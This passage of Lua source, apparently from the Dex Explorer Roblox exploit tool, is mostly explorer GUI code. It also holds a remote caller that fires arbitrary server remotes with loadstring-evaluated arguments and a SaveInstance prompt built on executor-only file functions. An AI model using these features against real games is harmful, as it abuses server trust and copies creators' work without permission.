	Position = UDim2.new(0,0,0,HEADER_SIZE);
	Size = UDim2.new(1,-GUI_SIZE,1,-HEADER_SIZE);
	Parent = explorerPanel;
})

local scrollBar = ScrollBar(false)
scrollBar.PageIncrement = 1
Create(scrollBar.GUI,{
	Position = UDim2.new(1,-GUI_SIZE,0,HEADER_SIZE);
	Size = UDim2.new(0,GUI_SIZE,1,-HEADER_SIZE);
	Parent = explorerPanel;
})

local scrollBarH = ScrollBar(true)
scrollBarH.PageIncrement = GUI_SIZE
Create(scrollBarH.GUI,{
	Position = UDim2.new(0,0,1,-GUI_SIZE);
	Size = UDim2.new(1,-GUI_SIZE,0,GUI_SIZE);
	Visible = false;
	Parent = explorerPanel;
})

local headerFrame = Create('Frame',{
	Name = "Header";
	BackgroundColor3 = GuiColor.Background;
	BorderColor3 = GuiColor.Border;
	Position = UDim2.new(0,0,0,0);
	Size = UDim2.new(1,0,0,HEADER_SIZE);
	Parent = explorerPanel;
	Create('TextLabel',{
		Text = "Explorer";
		BackgroundTransparency = 1;
		TextColor3 = GuiColor.Text;
		TextXAlignment = 'Left';
		Font = FONT;
		FontSize = FONT_SIZE;
		Position = UDim2.new(0,4,0,0);
		Size = UDim2.new(1,-4,0.5,0);
	});
})

local explorerFilter = 	Create('TextBox',{
	Text = "Filter Workspace";
	BackgroundTransparency = 0.8;
	TextColor3 = GuiColor.Text;
	TextXAlignment = 'Left';
	Font = FONT;
	FontSize = FONT_SIZE;
	Position = UDim2.new(0,4,0.5,0);
	Size = UDim2.new(1,-8,0.5,-2);
});
explorerFilter.Parent = headerFrame

SetZIndexOnChanged(explorerPanel)

local function CreateColor3(r, g, b) return Color3.new(r/255,g/255,b/255) end

local Styles = {
	Font = Enum.Font.Arial;
	Margin = 5;
	Black = CreateColor3(0,0,0);
	White = CreateColor3(255,255,255);
}

local DropDown = {
	Font = Styles.Font;
	FontSize = Enum.FontSize.Size14;
	TextColor = CreateColor3(0,0,0);
	TextColorOver = Styles.White;
	TextXAlignment = Enum.TextXAlignment.Left;
	Height = 20;
	BackColor = Styles.White;
	BackColorOver = CreateColor3(86,125,188);
	BorderColor = CreateColor3(216,216,216);
	BorderSizePixel = 2;
	ArrowColor = CreateColor3(160,160,160);
	ArrowColorOver = Styles.Black;
}

local Row = {
	Font = Styles.Font;
	FontSize = Enum.FontSize.Size14;
	TextXAlignment = Enum.TextXAlignment.Left;
	TextColor = Styles.Black;
	TextColorOver = Styles.White;
	TextLockedColor = CreateColor3(120,120,120);
	Height = 24;
	BorderColor = CreateColor3(216,216,216);
	BackgroundColor = Styles.White;
	BackgroundColorAlternate = CreateColor3(246,246,246);
	BackgroundColorMouseover = CreateColor3(211,224,244);
	TitleMarginLeft = 15;
}

local currentRightClickMenu
local CurrentInsertObjectWindow
local CurrentFunctionCallerWindow

local RbxApi

function ClassCanCreate(IName)
	local success,err = pcall(function() Instance.new(IName) end)
	if err then
		return false
	else
		return true
	end
end

function GetClasses()
	if RbxApi == nil then return {} end
	local classTable = {}
	for i,v in pairs(RbxApi.Classes) do
		if ClassCanCreate(v.Name) then
			table.insert(classTable,v.Name)
		end
	end
	return classTable
end

local function sortAlphabetic(t, property)
	table.sort(t, 
		function(x,y) return x[property] < y[property]
	end)
end

local function FunctionIsHidden(functionData)
	local tags = functionData["tags"]
	for _,name in pairs(tags) do
		if name == "deprecated"
			or name == "hidden"
			or name == "writeonly" then
			return true
		end
	end
	return false
end

local function GetAllFunctions(className)
	local class = RbxApi.Classes[className]
	local functions = {}
	
	if not class then return functions end
	
	while class do
		if class.Name == "Instance" then break end
		for _,nextFunction in pairs(class.Functions) do
			if not FunctionIsHidden(nextFunction) then
				table.insert(functions, nextFunction)
			end
		end
		class = RbxApi.Classes[class.Superclass]
	end
	
	sortAlphabetic(functions, "Name")

	return functions
end

function GetFunctions()
	if RbxApi == nil then return {} end
	local List = SelectionVar():Get()
	
	if #List == 0 then return end
	
	local MyObject = List[1]
	
	local functionTable = {}
	for i,v in pairs(GetAllFunctions(MyObject.ClassName)) do
		table.insert(functionTable,v)
	end
	return functionTable
end

function CreateInsertObjectMenu(choices, currentChoice, readOnly, onClick)
	local mouse = game.Players.LocalPlayer:GetMouse()
	local totalSize = explorerPanel.Parent.AbsoluteSize.y
	if #choices == 0 then return end
	
	table.sort(choices, function(a,b) return a < b end)

	local frame = Instance.new("Frame")	
	frame.Name = "InsertObject"
	frame.Size = UDim2.new(0, 200, 1, 0)
	frame.BackgroundTransparency = 1
	frame.Active = true
	
	local menu = nil
	local arrow = nil
	local expanded = false
	local margin = DropDown.BorderSizePixel;
	
	--[[
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	button.TextColor3 = Row.TextColor
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	end
	button.Text = currentChoice
	button.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	button.Position = UDim2.new(0, Styles.Margin, 0, 0)
	button.Parent = frame
	--]]
	
	local function hideMenu()
		expanded = false
		--showArrow(DropDown.ArrowColor)
		if frame then 
			--frame:Destroy()
			CurrentInsertObjectWindow.Visible = false
		end
	end
	
	local function showMenu()
		expanded = true
		menu = Instance.new("ScrollingFrame")
		menu.Size = UDim2.new(0,200,1,0)
		menu.CanvasSize = UDim2.new(0, 200, 0, #choices * DropDown.Height)
		menu.Position = UDim2.new(0, margin, 0, 0)
		menu.BackgroundTransparency = 0
		menu.BackgroundColor3 = DropDown.BackColor
		menu.BorderColor3 = DropDown.BorderColor
		menu.BorderSizePixel = DropDown.BorderSizePixel
		menu.TopImage = "rbxasset://textures/blackBkg_square.png"
		menu.MidImage = "rbxasset://textures/blackBkg_square.png"
		menu.BottomImage = "rbxasset://textures/blackBkg_square.png"
		menu.Active = true
		menu.ZIndex = 5
		menu.Parent = frame
		
		--local parentFrameHeight = script.Parent.List.Size.Y.Offset
		--local rowHeight = mouse.Y
		--if (rowHeight + menu.Size.Y.Offset) > parentFrameHeight then
		--	menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
		--end
			
		local function choice(name)
			onClick(name)
			hideMenu()
		end
		
		for i,name in pairs(choices) do
			local option = CreateRightClickMenuItem(name, function()
				choice(name)
			end,1)
			option.Size = UDim2.new(1, 0, 0, 20)
			option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
			option.ZIndex = menu.ZIndex
			option.Parent = menu
		end
	end


	showMenu()

	
	return frame
end

function CreateFunctionCallerMenu(choices, currentChoice, readOnly, onClick)
	local mouse = game.Players.LocalPlayer:GetMouse()
	local totalSize = explorerPanel.Parent.AbsoluteSize.y
	if #choices == 0 then return end
	
	table.sort(choices, function(a,b) return a.Name < b.Name end)

	local frame = Instance.new("Frame")	
	frame.Name = "InsertObject"
	frame.Size = UDim2.new(0, 200, 1, 0)
	frame.BackgroundTransparency = 1
	frame.Active = true
	
	local menu = nil
	local arrow = nil
	local expanded = false
	local margin = DropDown.BorderSizePixel;
	
	local function hideMenu()
		expanded = false
		--showArrow(DropDown.ArrowColor)
		if frame then 
			--frame:Destroy()
			CurrentInsertObjectWindow.Visible = false
		end
	end
	
	local function showMenu()
		expanded = true
		menu = Instance.new("ScrollingFrame")
		menu.Size = UDim2.new(0,300,1,0)
		menu.CanvasSize = UDim2.new(0, 300, 0, #choices * DropDown.Height)
		menu.Position = UDim2.new(0, margin, 0, 0)
		menu.BackgroundTransparency = 0
		menu.BackgroundColor3 = DropDown.BackColor
		menu.BorderColor3 = DropDown.BorderColor
		menu.BorderSizePixel = DropDown.BorderSizePixel
		menu.TopImage = "rbxasset://textures/blackBkg_square.png"
		menu.MidImage = "rbxasset://textures/blackBkg_square.png"
		menu.BottomImage = "rbxasset://textures/blackBkg_square.png"
		menu.Active = true
		menu.ZIndex = 5
		menu.Parent = frame
		
		--local parentFrameHeight = script.Parent.List.Size.Y.Offset
		--local rowHeight = mouse.Y
		--if (rowHeight + menu.Size.Y.Offset) > parentFrameHeight then
		--	menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
		--end
		
		local function GetParameters(functionData)
			local paraString = ""
			paraString = paraString.."("
			for i,v in pairs(functionData.Arguments) do
				paraString = paraString..v.Type.." "..v.Name
				if i < #functionData.Arguments then
					paraString = paraString..", "
				end
			end
			paraString = paraString..")"
			return paraString
		end
			
		local function choice(name)
			onClick(name)
			hideMenu()
		end
		
		for i,name in pairs(choices) do
			local option = CreateRightClickMenuItem(name.ReturnType.." "..name.Name..GetParameters(name), function()
				choice(name)
			end,2)
			option.Size = UDim2.new(1, 0, 0, 20)
			option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
			option.ZIndex = menu.ZIndex
			option.Parent = menu
		end
	end


	showMenu()

	
	return frame
end

function CreateInsertObject()
	if not CurrentInsertObjectWindow then return end
	CurrentInsertObjectWindow.Visible = true
	if currentRightClickMenu and CurrentInsertObjectWindow.Visible then
		CurrentInsertObjectWindow.Position = UDim2.new(0,currentRightClickMenu.Position.X.Offset-currentRightClickMenu.Size.X.Offset-2,0,0)
	end
	if CurrentInsertObjectWindow.Visible then
		CurrentInsertObjectWindow.Parent = explorerPanel.Parent
	end
end

function CreateFunctionCaller()
	if CurrentFunctionCallerWindow then
		CurrentFunctionCallerWindow:Destroy()
		CurrentFunctionCallerWindow = nil
	end
	CurrentFunctionCallerWindow = CreateFunctionCallerMenu(
		GetFunctions(),
		"",
		false,
		function(option)
			CurrentFunctionCallerWindow:Destroy()
			CurrentFunctionCallerWindow = nil
			local list = SelectionVar():Get()
			for i = 1,#list do
				pcall(function() Instance.new(option,list[i]) end)
			end
			print(option.Name .. " selected to be called. Function caller being added soon, please wait!")
			--CallFunction()
			DestroyRightClick()
		end
	)
	if currentRightClickMenu and CurrentFunctionCallerWindow then
		CurrentFunctionCallerWindow.Position = UDim2.new(0,currentRightClickMenu.Position.X.Offset-currentRightClickMenu.Size.X.Offset*1.5-2,0,0)
	end
	if CurrentFunctionCallerWindow then
		CurrentFunctionCallerWindow.Parent = explorerPanel.Parent
	end
end

function CreateRightClickMenuItem(text, onClick, insObj)
	local button = Instance.new("TextButton")
	button.Font = DropDown.Font
	button.FontSize = DropDown.FontSize
	button.TextColor3 = DropDown.TextColor
	button.TextXAlignment = DropDown.TextXAlignment
	button.BackgroundColor3 = DropDown.BackColor
	button.AutoButtonColor = false
	button.BorderSizePixel = 0
	button.Active = true
	button.Text = text
	
	if insObj == 1 then
		local newIcon = Icon(nil,ExplorerIndex[text] or 0)
		newIcon.Position = UDim2.new(0,0,0,2)
		newIcon.Size = UDim2.new(0,16,0,16)
		newIcon.IconMap.ZIndex = 5
		newIcon.Parent = button
		button.Text = "\t\t"..button.Text
	elseif insObj == 2 then
		button.FontSize = Enum.FontSize.Size11
	end
	
	button.MouseEnter:connect(function()
		button.TextColor3 = DropDown.TextColorOver
		button.BackgroundColor3 = DropDown.BackColorOver
		if not insObj and CurrentInsertObjectWindow then
			if CurrentInsertObjectWindow.Visible == false and button.Text == "Insert Object" then
				CreateInsertObject()
			elseif CurrentInsertObjectWindow.Visible and button.Text ~= "Insert Object" then
				CurrentInsertObjectWindow.Visible = false
			end
		end
		if not insObj then
			if CurrentFunctionCallerWindow and button.Text ~= "Call Function" then
				CurrentFunctionCallerWindow:Destroy()
				CurrentFunctionCallerWindow = nil
			elseif button.Text == "Call Function" then
				CreateFunctionCaller()
			end
		end
	end)
	button.MouseLeave:connect(function()
		button.TextColor3 = DropDown.TextColor
		button.BackgroundColor3 = DropDown.BackColor
	end)
	button.MouseButton1Click:connect(function()
		button.TextColor3 = DropDown.TextColor
		button.BackgroundColor3 = DropDown.BackColor
		onClick(text)
	end)	
	return button
end

function CreateRightClickMenu(choices, currentChoice, readOnly, onClick)
	local mouse = game.Players.LocalPlayer:GetMouse()

	local frame = Instance.new("Frame")	
	frame.Name = "DropDown"
	frame.Size = UDim2.new(0, 200, 1, 0)
	frame.BackgroundTransparency = 1
	frame.Active = true
	
	local menu = nil
	local arrow = nil
	local expanded = false
	local margin = DropDown.BorderSizePixel;
	
	--[[
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	button.TextColor3 = Row.TextColor
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	end
	button.Text = currentChoice
	button.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	button.Position = UDim2.new(0, Styles.Margin, 0, 0)
	button.Parent = frame
	--]]
	
	local function hideMenu()
		expanded = false
		--showArrow(DropDown.ArrowColor)
		if frame then 
			frame:Destroy()
			DestroyRightClick()
		end
	end
	
	local function showMenu()
		expanded = true
		menu = Instance.new("Frame")
		menu.Size = UDim2.new(0, 200, 0, #choices * DropDown.Height)
		menu.Position = UDim2.new(0, margin, 0, 5)
		menu.BackgroundTransparency = 0
		menu.BackgroundColor3 = DropDown.BackColor
		menu.BorderColor3 = DropDown.BorderColor
		menu.BorderSizePixel = DropDown.BorderSizePixel
		menu.Active = true
		menu.ZIndex = 5
		menu.Parent = frame
		
		--local parentFrameHeight = script.Parent.List.Size.Y.Offset
		--local rowHeight = mouse.Y
		--if (rowHeight + menu.Size.Y.Offset) > parentFrameHeight then
		--	menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
		--end
			
		local function choice(name)
			onClick(name)
			hideMenu()
		end
		
		for i,name in pairs(choices) do
			local option = CreateRightClickMenuItem(name, function()
				choice(name)
			end)
			option.Size = UDim2.new(1, 0, 0, 20)
			option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
			option.ZIndex = menu.ZIndex
			option.Parent = menu
		end
	end


	showMenu()

	
	return frame
end

function checkMouseInGui(gui)
	if gui == nil then return false end
	local plrMouse = game.Players.LocalPlayer:GetMouse()
	local guiPosition = gui.AbsolutePosition
	local guiSize = gui.AbsoluteSize	
	
	if plrMouse.X >= guiPosition.x and plrMouse.X <= guiPosition.x + guiSize.x and plrMouse.Y >= guiPosition.y and plrMouse.Y <= guiPosition.y + guiSize.y then
		return true
	else
		return false
	end
end

local clipboard = {}
local function delete(o)
	o.Parent = nil
end

local getTextWidth do
	local text = Create('TextLabel',{
		Name = "TextWidth";
		TextXAlignment = 'Left';
		TextYAlignment = 'Center';
		Font = FONT;
		FontSize = FONT_SIZE;
		Text = "";
		Position = UDim2.new(0,0,0,0);
		Size = UDim2.new(1,0,1,0);
		Visible = false;
		Parent = explorerPanel;
	})
	function getTextWidth(s)
		text.Text = s
		return text.TextBounds.x
	end
end

local nameScanned = false
-- Holds the game tree converted to a list.
local TreeList = {}
-- Matches objects to their tree node representation.
local NodeLookup = {}

local nodeWidth = 0

local QuickButtons = {}

function filteringWorkspace()
	if explorerFilter.Text ~= "" and explorerFilter.Text ~= "Filter Workspace" then
		return true
	end
	return false
end

function lookForAName(obj,name)
	for i,v in pairs(obj:GetChildren()) do
		if string.find(string.lower(v.Name),string.lower(name)) then nameScanned = true end
		lookForAName(v,name)
	end
end

function scanName(obj)
	nameScanned = false
	if string.find(string.lower(obj.Name),string.lower(explorerFilter.Text)) then
		nameScanned = true
	else
		lookForAName(obj,explorerFilter.Text)
	end
	return nameScanned
end

function updateActions()
	for i,v in pairs(QuickButtons) do
		if v.Cond() then
			v.Toggle(true)
		else
			v.Toggle(false)
		end
	end
end

local updateList,rawUpdateList,updateScroll,rawUpdateSize do
	local function r(t)
		for i = 1,#t do
			if not filteringWorkspace() or scanName(t[i].Object) then
				TreeList[#TreeList+1] = t[i]

				local w = (t[i].Depth)*(2+ENTRY_PADDING+GUI_SIZE) + 2 + ENTRY_SIZE + 4 + getTextWidth(t[i].Object.Name) + 4
				if w > nodeWidth then
					nodeWidth = w
				end
				if t[i].Expanded or filteringWorkspace() then
					r(t[i])
				end
			end
		end
	end

	function rawUpdateSize()
		scrollBarH.TotalSpace = nodeWidth
		scrollBarH.VisibleSpace = listFrame.AbsoluteSize.x
		scrollBarH:Update()
		local visible = scrollBarH:CanScrollDown() or scrollBarH:CanScrollUp()
		scrollBarH.GUI.Visible = visible

		listFrame.Size = UDim2.new(1,-GUI_SIZE,1,-GUI_SIZE*(visible and 1 or 0) - HEADER_SIZE)

		scrollBar.VisibleSpace = math.ceil(listFrame.AbsoluteSize.y/ENTRY_BOUND)
		scrollBar.GUI.Size = UDim2.new(0,GUI_SIZE,1,-GUI_SIZE*(visible and 1 or 0) - HEADER_SIZE)
		
		scrollBar.TotalSpace = #TreeList+1
		scrollBar:Update()
	end

	function rawUpdateList()
		-- Clear then repopulate the entire list. It appears to be fast enough.
		TreeList = {}
		nodeWidth = 0
		r(NodeLookup[workspace.Parent])
		if DexStorageEnabled then
			r(NodeLookup[DexStorage])
		end
		if NilStorageEnabled then
			r(NodeLookup[NilStorage])
		end
		rawUpdateSize()
		updateActions()
	end

	-- Adding or removing large models will cause many updates to occur. We
	-- can reduce the number of updates by creating a delay, then dropping any
	-- updates that occur during the delay.
	local updatingList = false
	function updateList()
		if updatingList then return end
		updatingList = true
		wait(0.25)
		updatingList = false
		rawUpdateList()
	end

	local updatingScroll = false
	function updateScroll()
		if updatingScroll then return end
		updatingScroll = true
		wait(0.25)
		updatingScroll = false
		scrollBar:Update()
	end
end

local Selection do
	local bindGetSelection = explorerPanel:FindFirstChild("GetSelection")
	if not bindGetSelection then
		bindGetSelection = Create('BindableFunction',{Name = "GetSelection"})
		bindGetSelection.Parent = explorerPanel
	end

	local bindSetSelection = explorerPanel:FindFirstChild("SetSelection")
	if not bindSetSelection then
		bindSetSelection = Create('BindableFunction',{Name = "SetSelection"})
		bindSetSelection.Parent = explorerPanel
	end

	local bindSelectionChanged = explorerPanel:FindFirstChild("SelectionChanged")
	if not bindSelectionChanged then
		bindSelectionChanged = Create('BindableEvent',{Name = "SelectionChanged"})
		bindSelectionChanged.Parent = explorerPanel
	end

	local SelectionList = {}
	local SelectionSet = {}
	local Updates = true
	Selection = {
		Selected = SelectionSet;
		List = SelectionList;
	}

	local function addObject(object)
		-- list update
		local lupdate = false
		-- scroll update
		local supdate = false

		if not SelectionSet[object] then
			local node = NodeLookup[object]
			if node then
				table.insert(SelectionList,object)
				SelectionSet[object] = true
				node.Selected = true

				-- expand all ancestors so that selected node becomes visible
				node = node.Parent
				while node do
					if not node.Expanded then
						node.Expanded = true
						lupdate = true
					end
					node = node.Parent
				end
				supdate = true
			end
		end
		return lupdate,supdate
	end

	function Selection:Set(objects)
		local lupdate = false
		local supdate = false

		if #SelectionList > 0 then
			for i = 1,#SelectionList do
				local object = SelectionList[i]
				local node = NodeLookup[object]
				if node then
					node.Selected = false
					SelectionSet[object] = nil
				end
			end

			SelectionList = {}
			Selection.List = SelectionList
			supdate = true
		end

		for i = 1,#objects do
			local l,s = addObject(objects[i])
			lupdate = l or lupdate
			supdate = s or supdate
		end

		if lupdate then
			rawUpdateList()
			supdate = true
		elseif supdate then
			scrollBar:Update()
		end

		if supdate then
			bindSelectionChanged:Fire()
			updateActions()
		end
	end

	function Selection:Add(object)
		local l,s = addObject(object)
		if l then
			rawUpdateList()
			if Updates then
				bindSelectionChanged:Fire()
				updateActions()
			end
		elseif s then
			scrollBar:Update()
			if Updates then
				bindSelectionChanged:Fire()
				updateActions()
			end
		end
	end
	
	function Selection:StopUpdates()
		Updates = false
	end
	
	function Selection:ResumeUpdates()
		Updates = true
		bindSelectionChanged:Fire()
		updateActions()
	end

	function Selection:Remove(object,noupdate)
		if SelectionSet[object] then
			local node = NodeLookup[object]
			if node then
				node.Selected = false
				SelectionSet[object] = nil
				for i = 1,#SelectionList do
					if SelectionList[i] == object then
						table.remove(SelectionList,i)
						break
					end
				end

				if not noupdate then
					scrollBar:Update()
				end
				bindSelectionChanged:Fire()
				updateActions()
			end
		end
	end

	function Selection:Get()
		local list = {}
		for i = 1,#SelectionList do
			list[i] = SelectionList[i]
		end
		return list
	end

	bindSetSelection.OnInvoke = function(...)
		Selection:Set(...)
	end

	bindGetSelection.OnInvoke = function()
		return Selection:Get()
	end
end

function CreateCaution(title,msg)
	local newCaution = CautionWindow:Clone()
	newCaution.Title.Text = title
	newCaution.MainWindow.Desc.Text = msg
	newCaution.Parent = explorerPanel.Parent
	newCaution.Visible = true
	newCaution.MainWindow.Ok.MouseButton1Up:connect(function()
		newCaution:Destroy()
	end)
end

function CreateTableCaution(title,msg)
	if type(msg) ~= "table" then return CreateCaution(title,tostring(msg)) end
	local newCaution = TableCautionWindow:Clone()
	newCaution.Title.Text = title
	
	local TableList = newCaution.MainWindow.TableResults
	local TableTemplate = newCaution.MainWindow.TableTemplate
	
	for i,v in pairs(msg) do
		local newResult = TableTemplate:Clone()
		newResult.Type.Text = type(v)
		newResult.Value.Text = tostring(v)
		newResult.Position = UDim2.new(0,0,0,#TableList:GetChildren() * 20)
		newResult.Parent = TableList
		TableList.CanvasSize = UDim2.new(0,0,0,#TableList:GetChildren() * 20)
		newResult.Visible = true
	end
	newCaution.Parent = explorerPanel.Parent
	newCaution.Visible = true
	newCaution.MainWindow.Ok.MouseButton1Up:connect(function()
		newCaution:Destroy()
	end)
end

local function Split(str, delimiter)
	local start = 1
	local t = {}
	while true do
		local pos = string.find (str, delimiter, start, true)
		if not pos then
			break
		end
		table.insert (t, string.sub (str, start, pos - 1))
		start = pos + string.len (delimiter)
	end
	table.insert (t, string.sub (str, start))
	return t
end

local function ToValue(value,type)
	if type == "Vector2" then
		local list = Split(value,",")
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return Vector2.new(x,y)
	elseif type == "Vector3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		local z = tonumber(list[3]) or 0
		return Vector3.new(x,y,z)
	elseif type == "Color3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local r = tonumber(list[1]) or 0
		local g = tonumber(list[2]) or 0
		local b = tonumber(list[3]) or 0
		return Color3.new(r/255,g/255, b/255)
	elseif type == "UDim2" then
		local list = Split(string.gsub(string.gsub(value, "{", ""),"}",""),",")
		if #list < 4 then return nil end
		local xScale = tonumber(list[1]) or 0
		local xOffset = tonumber(list[2]) or 0
		local yScale = tonumber(list[3]) or 0
		local yOffset = tonumber(list[4]) or 0
		return UDim2.new(xScale, xOffset, yScale, yOffset)
	elseif type == "Number" then
		return tonumber(value)
	elseif type == "String" then
		return value
	elseif type == "NumberRange" then
		local list = Split(value,",")
		if #list == 1 then
			if tonumber(list[1]) == nil then return nil end
			local newVal = tonumber(list[1]) or 0
			return NumberRange.new(newVal)
		end
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return NumberRange.new(x,y)
	elseif type == "Script" then
		local success,err = ypcall(function()
		_G.D_E_X_DONOTUSETHISPLEASE = nil
		loadstring(
			"_G.D_E_X_DONOTUSETHISPLEASE = "..value
		)()
		return _G.D_E_X_DONOTUSETHISPLEASE
		end)
		if err then
			return nil
		end
	else
		return nil
	end
end

local function ToPropValue(value,type)
	if type == "Vector2" then
		local list = Split(value,",")
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return Vector2.new(x,y)
	elseif type == "Vector3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		local z = tonumber(list[3]) or 0
		return Vector3.new(x,y,z)
	elseif type == "Color3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local r = tonumber(list[1]) or 0
		local g = tonumber(list[2]) or 0
		local b = tonumber(list[3]) or 0
		return Color3.new(r/255,g/255, b/255)
	elseif type == "UDim2" then
		local list = Split(string.gsub(string.gsub(value, "{", ""),"}",""),",")
		if #list < 4 then return nil end
		local xScale = tonumber(list[1]) or 0
		local xOffset = tonumber(list[2]) or 0
		local yScale = tonumber(list[3]) or 0
		local yOffset = tonumber(list[4]) or 0
		return UDim2.new(xScale, xOffset, yScale, yOffset)
	elseif type == "Content" then
		return value
	elseif type == "float" or type == "int" or type == "double" then
		return tonumber(value)
	elseif type == "string" then
		return value
	elseif type == "NumberRange" then
		local list = Split(value,",")
		if #list == 1 then
			if tonumber(list[1]) == nil then return nil end
			local newVal = tonumber(list[1]) or 0
			return NumberRange.new(newVal)
		end
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return NumberRange.new(x,y)
	elseif string.sub(value,1,4) == "Enum" then
		local getEnum = value
		while true do
			local x,y = string.find(getEnum,".")
			if y then
				getEnum = string.sub(getEnum,y+1)
			else
				break
			end
		end
		print(getEnum)
		return getEnum
	else
		return nil
	end
end

function PromptRemoteCaller(inst)
	if CurrentRemoteWindow then
		CurrentRemoteWindow:Destroy()
		CurrentRemoteWindow = nil
	end
	CurrentRemoteWindow = RemoteWindow:Clone()
	CurrentRemoteWindow.Parent = explorerPanel.Parent
	CurrentRemoteWindow.Visible = true
	
	local displayValues = false
	
	local ArgumentList = CurrentRemoteWindow.MainWindow.Arguments
	local ArgumentTemplate = CurrentRemoteWindow.MainWindow.ArgumentTemplate
	
	if inst:IsA("RemoteEvent") then
		CurrentRemoteWindow.Title.Text = "Fire Event"
		CurrentRemoteWindow.MainWindow.Ok.Text = "Fire"
		CurrentRemoteWindow.MainWindow.DisplayReturned.Visible = false
		CurrentRemoteWindow.MainWindow.Desc2.Visible = false
	end
	
	local newArgument = ArgumentTemplate:Clone()
	newArgument.Parent = ArgumentList
	newArgument.Visible = true
	newArgument.Type.MouseButton1Down:connect(function()
		createDDown(newArgument.Type,function(choice)
			newArgument.Type.Text = choice
		end,"Script","Number","String","Color3","Vector3","Vector2","UDim2","NumberRange")
	end)
	
	CurrentRemoteWindow.MainWindow.Ok.MouseButton1Up:connect(function()
		if CurrentRemoteWindow and inst.Parent ~= nil then
			local MyArguments = {}
			for i,v in pairs(ArgumentList:GetChildren()) do
				table.insert(MyArguments,ToValue(v.Value.Text,v.Type.Text))
			end
			if inst:IsA("RemoteFunction") then
				if displayValues then
					spawn(function()
						local myResults = inst:InvokeServer(unpack(MyArguments))
						if myResults then
							CreateTableCaution("Remote Caller",myResults)
						else
							CreateCaution("Remote Caller","This remote did not return anything.")
						end
					end)
				else
					spawn(function()
						inst:InvokeServer(unpack(MyArguments))
					end)
				end
			else
				inst:FireServer(unpack(MyArguments))
			end
			CurrentRemoteWindow:Destroy()
			CurrentRemoteWindow = nil
		end
	end)
	
	CurrentRemoteWindow.MainWindow.Add.MouseButton1Up:connect(function()
		if CurrentRemoteWindow then
			local newArgument = ArgumentTemplate:Clone()
			newArgument.Position = UDim2.new(0,0,0,#ArgumentList:GetChildren() * 20)
			newArgument.Parent = ArgumentList
			ArgumentList.CanvasSize = UDim2.new(0,0,0,#ArgumentList:GetChildren() * 20)
			newArgument.Visible = true
			newArgument.Type.MouseButton1Down:connect(function()
				createDDown(newArgument.Type,function(choice)
					newArgument.Type.Text = choice
				end,"Script","Number","String","Color3","Vector3","Vector2","UDim2","NumberRange")
			end)
		end
	end)
	
	CurrentRemoteWindow.MainWindow.Subtract.MouseButton1Up:connect(function()
		if CurrentRemoteWindow then
			if #ArgumentList:GetChildren() > 1 then
				ArgumentList:GetChildren()[#ArgumentList:GetChildren()]:Destroy()
				ArgumentList.CanvasSize = UDim2.new(0,0,0,#ArgumentList:GetChildren() * 20)
			end
		end
	end)
	
	CurrentRemoteWindow.MainWindow.Cancel.MouseButton1Up:connect(function()
		if CurrentRemoteWindow then
			CurrentRemoteWindow:Destroy()
			CurrentRemoteWindow = nil
		end
	end)
	
	CurrentRemoteWindow.MainWindow.DisplayReturned.MouseButton1Up:connect(function()
		if displayValues then
			displayValues = false
			CurrentRemoteWindow.MainWindow.DisplayReturned.enabled.Visible = false
		else
			displayValues = true
			CurrentRemoteWindow.MainWindow.DisplayReturned.enabled.Visible = true
		end
	end)
end

function PromptSaveInstance(inst)
	if not SaveInstance and not _G.SaveInstance then CreateCaution("SaveInstance Missing","You do not have the SaveInstance function installed. Please go to RaspberryPi's thread to retrieve it.") return end
	if CurrentSaveInstanceWindow then
		CurrentSaveInstanceWindow:Destroy()
		CurrentSaveInstanceWindow = nil
		if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
			explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
		end
	end
	CurrentSaveInstanceWindow = SaveInstanceWindow:Clone()
	CurrentSaveInstanceWindow.Parent = explorerPanel.Parent
	CurrentSaveInstanceWindow.Visible = true
	
	local filename = CurrentSaveInstanceWindow.MainWindow.FileName
	local saveObjects = true
	local overwriteCaution = false
	
	CurrentSaveInstanceWindow.MainWindow.Save.MouseButton1Up:connect(function()
		if readfile and getelysianpath then
			if readfile(getelysianpath()..filename.Text..".rbxmx") then
				if not overwriteCaution then
					overwriteCaution = true
					local newCaution = ConfirmationWindow:Clone()
					newCaution.Name = "SaveInstanceOverwriteCaution"
					newCaution.MainWindow.Desc.Text = "The file, "..filename.Text..".rbxmx, already exists. Overwrite?"
					newCaution.Parent = explorerPanel.Parent
					newCaution.Visible = true
					newCaution.MainWindow.Yes.MouseButton1Up:connect(function()
						ypcall(function()
							SaveInstance(inst,filename.Text..".rbxmx",not saveObjects)
						end)
						overwriteCaution = false
						newCaution:Destroy()
						if CurrentSaveInstanceWindow then
							CurrentSaveInstanceWindow:Destroy()
							CurrentSaveInstanceWindow = nil
						end
					end)
					newCaution.MainWindow.No.MouseButton1Up:connect(function()
						overwriteCaution = false
						newCaution:Destroy()
					end)
